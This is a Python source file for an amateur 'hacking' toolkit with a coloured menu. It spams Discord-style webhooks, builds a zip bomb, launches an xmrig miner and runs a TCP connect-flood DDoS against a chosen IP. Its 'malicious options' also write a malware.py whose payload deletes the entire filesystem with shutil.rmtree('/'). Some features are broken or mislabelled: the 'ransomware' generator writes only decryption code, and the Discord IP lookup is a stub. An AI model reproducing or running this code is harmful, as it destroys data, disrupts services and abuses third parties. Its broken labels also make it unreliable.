import os
import time
import requests
from bs4 import BeautifulSoup
import socket
import zipfile


def Mainscreen():
    global username
    print("\033[1;37;40m \033[0;37;48m")
    os.system("cls")
    print("\033[1;34;40mOSINT")
    print("\033[1;35;40mWebhook Spammer / Alias: webhook")
    print("\033[1;34;40mMalicious Options / Alias: malicious")
    print("\033[1;35;40mZip bomb generator / Alias: zip")
    print("\033[1;34;40mRoblox card generator / Alias: roblox")
    print("\033[1;35;40mDiscord Id lookup / Alias: discord")
    print("\033[1;35;40mIp Lookup / Alias: ip")
    print("\033[1;34;40mCrypto miner / Alias: miner")
    print("\033[1;34;40m")
    print("")
    choice = input("\033[1;35;40mChoice: \033[1;37;40m \033[0;37;48m")
    if choice.lower() == "osint":
        username = input("Enter name: ")
        sherlock_search(username)
    elif choice.lower() == "webhook" or choice.lower() == "webhook spammer":
        webhookspam()
    elif choice.lower() == "malicious" or choice.lower() == "malicious options":
        malicious_options()
    elif choice.lower() == "zip" or choice.lower() == "zip bomb generator":
        name = input("what would you like the file name to be: ")
        print("\033[1;31;40mGenerating zip bomb... This might take a while.")
        generate_zip_bomb(name)
    elif choice.lower() == "roblox" or choice.lower() == "roblox card generator":
        print("\033[1;31;40mThis feature is not available yet.")
        time.sleep(3)
        Mainscreen()
    elif choice.lower() == "discord" or choice.lower() == "discord id to ip":
        discordidtoip()
    elif choice.lower() == "obfuscator":
        #obfuscator()
        print("\033[1;31;40mThis feature is not available yet.")
    elif choice.lower() == "ip" or choice.lower() == "ip lookup":
        ip = input("Enter the IP address: ")
        iplookup(ip)
    elif choice.lower() == "miner" or choice.lower() == "crypto miner":
        miner()
    else:
        print("\033[1;31;40mPlease enter a valid option.")
        time.sleep(3)
        Mainscreen()

def miner():
    pool = input("Enter the pool address: ")
    wallet = input("Enter the wallet address: ")
    threads = input("Enter the number of threads: ")
    try:
        os.system(f"xmrig -o {pool} -u {wallet} -p x -t {threads}")
    except:
        print("\033[0;37;41mError: xmrig is not installed.")
        time.sleep(3)
        Mainscreen()


def obfuscator():
    print("obufscating")


def iplookup(ip):
    url = f"https://ipinfo.io/{ip}/json"
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(url, headers=headers)
    
        if response.status_code == 200:
            data = response.json()
            print(f"\033[1;34;40mIP: {data['ip']}")
            print(f"\033[1;34;40mCity: {data['city']}")
            print(f"\033[1;34;40mRegion: {data['region']}")
            print(f"\033[1;34;40mCountry: {data['country']}")
            print(f"\033[1;34;40mLocation: {data['loc']}")
            print(f"\033[1;34;40mOrganization: {data['org']}")
        else:
            print('\033[0;37;41mError connecting to ipinfo.io.')
            Mainscreen()
    except Exception as e:
        print(f"\033[0;37;41mError: {e}")
    input("\033[0;37;40mPress enter to continue")
    Mainscreen()

id = "0"
def discordidtoip():
    print("Doesnt work")
    

def webhookspam():
    j = 0
    webhook_url = input("Enter the webhook URL: ")
    message = input("Enter the message to spam: ")
    amount = int(input("Enter the amount of times to spam: "))
    while True:
        requests.post(webhook_url, json={"content": message})
        j = j + 1
        print(f"{j} message\s sent")
        if j == amount:
            break
    Mainscreen()

def generate_zip_bomb(name):
    zip_file = zipfile.ZipFile(f"{name}.zip", "w", zipfile.ZIP_DEFLATED)

    for i in range(10000):  
        zip_file.writestr(f"evil_{i}.txt", "Jamal" * 10000000)
    zip_file.close()
    input("\033[0;37;40mPress enter to continue")
    Mainscreen()

def generate_ransomware():
    with open("ransomware.py", "w") as ransomware_file:
        ransomware_code = f"""
from cryptography.fernet import Fernet
import os

def load_key():
    return open("key.key", "rb").read()

def decrypt_file(filename, key):
    fernet = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
        decrypted_data = fernet.decrypt(file_data)
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def decrypt_files():
    key = load_key()
    for root, _, files in os.walk("target_directory"):
        for file in files:
            decrypt_file(os.path.join(root, file), key)

decrypt_files()
"""
        ransomware_file.write(ransomware_code)

def generate_malware():
    with open("malware.py", "w") as malware_file:
        malware_code = f"""
import os
import shutil

def execute_malicious_payload():
    # Add your malicious payload execution code here
    # Example: Delete all files on the system
    shutil.rmtree('/')
    pass

execute_malicious_payload()
"""
        malware_file.write(malware_code)

def malicious_options():
    print("Malicious Options:")
    print("1. Generate a ransomware program")
    print("2. Create a malware payload")
    print("3. Launch a DDoS attack")
    print("4. Scrape sensitive information")
    print("5. Go Back")
    choice = input("Enter your choice: ")

    if choice == "1":
        generate_ransomware()
        print("Ransomware program generated as ransomware.py")
    elif choice == "2":
        generate_malware()
        print("Malware payload generated as malware.py")
    elif choice == "3":
        target_ip = input("Enter the target IP for the DDoS attack: ")
        target_port = input("Enter the target port: ")
        ddos_attack(target_ip, target_port)
    elif choice == "4":
        username = input("Enter the username for sensitive information scraping: ")
        sherlock_search(username)
    elif choice == "5":
        Mainscreen()
    else:
        print("Invalid choice. Please try again.")

def ddos_attack(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b'GET / HTTP/1.1\r\n')
        except:
            pass

def sherlock_search(username):
    url = 'https://www.google.com/search?q=' + username
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(url, headers=headers)
    
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            results = soup.find_all('h3')

            for result in results:
                print(f"\033[1;34;40m{result.text}")
        else:
            print('Error connecting to Google.')
    except Exception as e:
        print(f"\033[0;37;41mError: {e}")
    input("\033[0;37;40mPress enter to continue")
    Mainscreen()

username = 'target_username'

def animationjamal():
    os.system("cls")
    print("\033[1;37;40m \033[2;37;40mLoading \ ")
    time.sleep(0.1)
    os.system("cls")
    print("\033[1;37;40m \033[2;37;40mLoading | ")
    time.sleep(0.1)
    os.system("cls")
    print("\033[1;37;40m \033[2;37;40mLoading / ")
    time.sleep(0.1)
    os.system("cls")
    print("\033[1;37;40m \033[2;37;40mLoading — ")
    time.sleep(0.1)
    os.system("cls")
    
if __name__ == "__main__":
    animationjamal()
    animationjamal()
    animationjamal()
    animationjamal()
    animationjamal()
    animationjamal()
    Mainscreen()